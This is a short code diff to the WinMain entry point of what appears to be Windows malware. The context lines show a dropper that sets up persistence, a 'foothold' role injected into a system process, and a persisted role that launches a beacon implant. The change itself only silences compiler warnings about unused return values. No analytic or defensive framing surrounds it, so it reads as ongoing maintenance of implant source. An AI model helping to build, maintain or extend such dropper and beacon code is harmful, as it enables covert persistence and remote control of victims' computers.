@@ -83,6 +83,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (IsSystemProcess(currentPath)) {
         LOG_INFO("Detected Role: Foothold (Injected)");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+        (void)hr;
 
         // Try to establish persistence from IPC path if available
         wchar_t dropperPath[MAX_PATH] = {0};
@@ -112,6 +113,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (IsRunningFromPersistLocation(currentPath)) {
         LOG_INFO("Detected Role: Persisted");
         HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+        (void)hr;
+
         beacon::Beacon implant;
         implant.run();
         CoUninitialize();
@@ -131,6 +134,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    (void)hr;
 
     // 1. Establish Persistence immediately from dropper
     LOG_INFO("Dropper: Establishing initial persistence...");
